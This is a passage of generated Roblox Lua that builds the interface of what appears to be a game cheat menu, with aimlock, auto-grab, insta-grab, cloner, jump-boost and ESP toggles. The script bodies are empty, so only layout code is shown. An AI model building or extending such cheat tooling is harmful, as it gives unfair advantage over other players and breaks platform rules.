G2L["183"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["183"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["183"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Circle.Mini
G2L["184"] = Instance.new("Frame", G2L["183"]);
G2L["184"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["184"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["184"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["184"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["184"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["184"]["Name"] = [[Mini]];
G2L["184"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Circle.Mini.UICorner
G2L["185"] = Instance.new("UICorner", G2L["184"]);
G2L["185"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Circle.UICorner
G2L["186"] = Instance.new("UICorner", G2L["183"]);
G2L["186"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Button
G2L["187"] = Instance.new("TextButton", G2L["182"]);
G2L["187"]["BorderSizePixel"] = 0;
G2L["187"]["TextSize"] = 14;
G2L["187"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["187"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["187"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["187"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["187"]["BackgroundTransparency"] = 1;
G2L["187"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["187"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["187"]["Text"] = [[]];
G2L["187"]["Name"] = [[Button]];
G2L["187"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Button.LocalScript
G2L["188"] = Instance.new("LocalScript", G2L["187"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.UIPadding
G2L["189"] = Instance.new("UIPadding", G2L["182"]);
G2L["189"]["PaddingTop"] = UDim.new(0, 4);
G2L["189"]["PaddingRight"] = UDim.new(0, 4);
G2L["189"]["PaddingLeft"] = UDim.new(0, 4);
G2L["189"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.UICorner
G2L["18a"] = Instance.new("UICorner", G2L["182"]);
G2L["18a"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle
G2L["18b"] = Instance.new("Frame", G2L["101"]);
G2L["18b"]["BorderSizePixel"] = 0;
G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18b"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["18b"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["18b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18b"]["Name"] = [[AutoGrabToggle]];
G2L["18b"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Main Handler
G2L["18c"] = Instance.new("LocalScript", G2L["18b"]);
G2L["18c"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder
G2L["18d"] = Instance.new("Frame", G2L["18b"]);
G2L["18d"]["ZIndex"] = 2;
G2L["18d"]["BorderSizePixel"] = 0;
G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["18d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["18d"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["18d"]["Position"] = UDim2.new(0.459, 0, 0.46667, -2);
G2L["18d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["18d"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Circle
G2L["18e"] = Instance.new("Frame", G2L["18d"]);
G2L["18e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18e"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["18e"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["18e"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["18e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["18e"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Circle.Mini
G2L["18f"] = Instance.new("Frame", G2L["18e"]);
G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["18f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["18f"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["18f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["18f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["18f"]["Name"] = [[Mini]];
G2L["18f"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Circle.Mini.UICorner
G2L["190"] = Instance.new("UICorner", G2L["18f"]);
G2L["190"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Circle.UICorner
G2L["191"] = Instance.new("UICorner", G2L["18e"]);
G2L["191"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Button
G2L["192"] = Instance.new("TextButton", G2L["18d"]);
G2L["192"]["BorderSizePixel"] = 0;
G2L["192"]["TextSize"] = 14;
G2L["192"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["192"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["192"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["192"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["192"]["BackgroundTransparency"] = 1;
G2L["192"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["192"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["192"]["Text"] = [[]];
G2L["192"]["Name"] = [[Button]];
G2L["192"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Button.LocalScript
G2L["193"] = Instance.new("LocalScript", G2L["192"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.UIPadding
G2L["194"] = Instance.new("UIPadding", G2L["18d"]);
G2L["194"]["PaddingTop"] = UDim.new(0, 4);
G2L["194"]["PaddingRight"] = UDim.new(0, 4);
G2L["194"]["PaddingLeft"] = UDim.new(0, 4);
G2L["194"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.UICorner
G2L["195"] = Instance.new("UICorner", G2L["18d"]);
G2L["195"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle
G2L["196"] = Instance.new("Frame", G2L["101"]);
G2L["196"]["BorderSizePixel"] = 0;
G2L["196"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["196"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["196"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["196"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["196"]["Name"] = [[InstaGrabToggle]];
G2L["196"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Main Handler
G2L["197"] = Instance.new("LocalScript", G2L["196"]);
G2L["197"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder
G2L["198"] = Instance.new("Frame", G2L["196"]);
G2L["198"]["ZIndex"] = 2;
G2L["198"]["BorderSizePixel"] = 0;
G2L["198"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["198"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["198"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["198"]["Position"] = UDim2.new(0.459, 0, 1.06667, -2);
G2L["198"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["198"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Circle
G2L["199"] = Instance.new("Frame", G2L["198"]);
G2L["199"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["199"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["199"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["199"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["199"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["199"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Circle.Mini
G2L["19a"] = Instance.new("Frame", G2L["199"]);
G2L["19a"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["19a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["19a"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["19a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["19a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["19a"]["Name"] = [[Mini]];
G2L["19a"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Circle.Mini.UICorner
G2L["19b"] = Instance.new("UICorner", G2L["19a"]);
G2L["19b"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Circle.UICorner
G2L["19c"] = Instance.new("UICorner", G2L["199"]);
G2L["19c"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Button
G2L["19d"] = Instance.new("TextButton", G2L["198"]);
G2L["19d"]["BorderSizePixel"] = 0;
G2L["19d"]["TextSize"] = 14;
G2L["19d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["19d"]["BackgroundTransparency"] = 1;
G2L["19d"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["19d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["19d"]["Text"] = [[]];
G2L["19d"]["Name"] = [[Button]];
G2L["19d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Button.LocalScript
G2L["19e"] = Instance.new("LocalScript", G2L["19d"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.UIPadding
G2L["19f"] = Instance.new("UIPadding", G2L["198"]);
G2L["19f"]["PaddingTop"] = UDim.new(0, 4);
G2L["19f"]["PaddingRight"] = UDim.new(0, 4);
G2L["19f"]["PaddingLeft"] = UDim.new(0, 4);
G2L["19f"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.UICorner
G2L["1a0"] = Instance.new("UICorner", G2L["198"]);
G2L["1a0"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle
G2L["1a1"] = Instance.new("Frame", G2L["101"]);
G2L["1a1"]["BorderSizePixel"] = 0;
G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a1"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["1a1"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["1a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a1"]["Name"] = [[ClonerToggle]];
G2L["1a1"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Main Handler
G2L["1a2"] = Instance.new("LocalScript", G2L["1a1"]);
G2L["1a2"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder
G2L["1a3"] = Instance.new("Frame", G2L["1a1"]);
G2L["1a3"]["ZIndex"] = 2;
G2L["1a3"]["BorderSizePixel"] = 0;
G2L["1a3"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1a3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1a3"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["1a3"]["Position"] = UDim2.new(0.459, 0, 1.66667, -2);
G2L["1a3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a3"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Circle
G2L["1a4"] = Instance.new("Frame", G2L["1a3"]);
G2L["1a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a4"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["1a4"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["1a4"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["1a4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a4"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Circle.Mini
G2L["1a5"] = Instance.new("Frame", G2L["1a4"]);
G2L["1a5"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1a5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1a5"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1a5"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1a5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a5"]["Name"] = [[Mini]];
G2L["1a5"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Circle.Mini.UICorner
G2L["1a6"] = Instance.new("UICorner", G2L["1a5"]);
G2L["1a6"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Circle.UICorner
G2L["1a7"] = Instance.new("UICorner", G2L["1a4"]);
G2L["1a7"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Button
G2L["1a8"] = Instance.new("TextButton", G2L["1a3"]);
G2L["1a8"]["BorderSizePixel"] = 0;
G2L["1a8"]["TextSize"] = 14;
G2L["1a8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a8"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1a8"]["BackgroundTransparency"] = 1;
G2L["1a8"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["1a8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a8"]["Text"] = [[]];
G2L["1a8"]["Name"] = [[Button]];
G2L["1a8"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Button.LocalScript
G2L["1a9"] = Instance.new("LocalScript", G2L["1a8"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.UIPadding
G2L["1aa"] = Instance.new("UIPadding", G2L["1a3"]);
G2L["1aa"]["PaddingTop"] = UDim.new(0, 4);
G2L["1aa"]["PaddingRight"] = UDim.new(0, 4);
G2L["1aa"]["PaddingLeft"] = UDim.new(0, 4);
G2L["1aa"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.UICorner
G2L["1ab"] = Instance.new("UICorner", G2L["1a3"]);
G2L["1ab"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle
G2L["1ac"] = Instance.new("Frame", G2L["101"]);
G2L["1ac"]["BorderSizePixel"] = 0;
G2L["1ac"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ac"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["1ac"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["1ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ac"]["Name"] = [[BrokenToggle]];
G2L["1ac"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Main Handler
G2L["1ad"] = Instance.new("LocalScript", G2L["1ac"]);
G2L["1ad"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder
G2L["1ae"] = Instance.new("Frame", G2L["1ac"]);
G2L["1ae"]["ZIndex"] = 2;
G2L["1ae"]["BorderSizePixel"] = 0;
G2L["1ae"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1ae"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1ae"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["1ae"]["Position"] = UDim2.new(0.459, 0, 2.26667, -2);
G2L["1ae"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1ae"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Circle
G2L["1af"] = Instance.new("Frame", G2L["1ae"]);
G2L["1af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1af"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["1af"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["1af"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["1af"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1af"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Circle.Mini
G2L["1b0"] = Instance.new("Frame", G2L["1af"]);
G2L["1b0"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1b0"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1b0"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1b0"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1b0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1b0"]["Name"] = [[Mini]];
G2L["1b0"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Circle.Mini.UICorner
G2L["1b1"] = Instance.new("UICorner", G2L["1b0"]);
G2L["1b1"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Circle.UICorner
G2L["1b2"] = Instance.new("UICorner", G2L["1af"]);
G2L["1b2"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Button
G2L["1b3"] = Instance.new("TextButton", G2L["1ae"]);
G2L["1b3"]["BorderSizePixel"] = 0;
G2L["1b3"]["TextSize"] = 14;
G2L["1b3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1b3"]["BackgroundTransparency"] = 1;
G2L["1b3"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["1b3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1b3"]["Text"] = [[]];
G2L["1b3"]["Name"] = [[Button]];
G2L["1b3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Button.LocalScript
G2L["1b4"] = Instance.new("LocalScript", G2L["1b3"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.UIPadding
G2L["1b5"] = Instance.new("UIPadding", G2L["1ae"]);
G2L["1b5"]["PaddingTop"] = UDim.new(0, 4);
G2L["1b5"]["PaddingRight"] = UDim.new(0, 4);
G2L["1b5"]["PaddingLeft"] = UDim.new(0, 4);
G2L["1b5"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.UICorner
G2L["1b6"] = Instance.new("UICorner", G2L["1ae"]);
G2L["1b6"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals
G2L["1b7"] = Instance.new("Frame", G2L["30"]);
G2L["1b7"]["Visible"] = false;
G2L["1b7"]["ZIndex"] = 3;
G2L["1b7"]["BorderSizePixel"] = 0;
G2L["1b7"]["BackgroundColor3"] = Color3.fromRGB(10, 30, 13);
G2L["1b7"]["ClipsDescendants"] = true;
G2L["1b7"]["Size"] = UDim2.new(0, 366, 0, 281);
G2L["1b7"]["Position"] = UDim2.new(-0.02286, 0, 0.00151, 0);
G2L["1b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b7"]["Name"] = [[Visuals]];
G2L["1b7"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.Frame
G2L["1b8"] = Instance.new("Frame", G2L["1b7"]);
G2L["1b8"]["BorderSizePixel"] = 0;
G2L["1b8"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34);
G2L["1b8"]["Size"] = UDim2.new(0, 373, 0, 25);
G2L["1b8"]["Position"] = UDim2.new(-0.0198, 0, -0.00105, 0);
G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b8"]["BackgroundTransparency"] = 0.6;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.Frame.UICorner
G2L["1b9"] = Instance.new("UICorner", G2L["1b8"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.Frame.TextLabel
G2L["1ba"] = Instance.new("TextLabel", G2L["1b8"]);
G2L["1ba"]["BorderSizePixel"] = 0;
G2L["1ba"]["TextSize"] = 14;
G2L["1ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1ba"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ba"]["BackgroundTransparency"] = 1;
G2L["1ba"]["Size"] = UDim2.new(0, 48, 0, 16);
G2L["1ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ba"]["Text"] = [[--Visuals--]];
G2L["1ba"]["Position"] = UDim2.new(0.42265, 0, 0.16, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame
G2L["1bb"] = Instance.new("ScrollingFrame", G2L["1b7"]);
G2L["1bb"]["Active"] = true;
G2L["1bb"]["ZIndex"] = 2;
G2L["1bb"]["BorderSizePixel"] = 0;
G2L["1bb"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["1bb"]["Size"] = UDim2.new(0, 364, 0, 255);
G2L["1bb"]["ScrollBarImageColor3"] = Color3.fromRGB(68, 68, 68);
G2L["1bb"]["Position"] = UDim2.new(-0.00068, 0, 0.09148, 0);
G2L["1bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bb"]["ScrollBarThickness"] = 4;
G2L["1bb"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoost
G2L["1bc"] = Instance.new("Frame", G2L["1bb"]);
G2L["1bc"]["BorderSizePixel"] = 0;
G2L["1bc"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1bc"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1bc"]["Position"] = UDim2.new(0.01, 15, 0.011, 0);
G2L["1bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bc"]["Name"] = [[SpeedBoost]];
G2L["1bc"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoost.UICorner
G2L["1bd"] = Instance.new("UICorner", G2L["1bc"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoost.UIStroke
G2L["1be"] = Instance.new("UIStroke", G2L["1bc"]);
G2L["1be"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoost.TextLabel
G2L["1bf"] = Instance.new("TextLabel", G2L["1bc"]);
G2L["1bf"]["BorderSizePixel"] = 0;
G2L["1bf"]["TextSize"] = 14;
G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["BackgroundTransparency"] = 1;
G2L["1bf"]["Size"] = UDim2.new(0, 102, 0, 16);
G2L["1bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bf"]["Text"] = [[EspBestBrainrot]];
G2L["1bf"]["Position"] = UDim2.new(0.087, 0, 0.253, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle
G2L["1c0"] = Instance.new("Frame", G2L["1bb"]);
G2L["1c0"]["BorderSizePixel"] = 0;
G2L["1c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c0"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["1c0"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["1c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c0"]["Name"] = [[JumpBoostToggle]];
G2L["1c0"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Main Handler
G2L["1c1"] = Instance.new("LocalScript", G2L["1c0"]);
G2L["1c1"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder
G2L["1c2"] = Instance.new("Frame", G2L["1c0"]);
G2L["1c2"]["ZIndex"] = 2;
G2L["1c2"]["BorderSizePixel"] = 0;
G2L["1c2"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
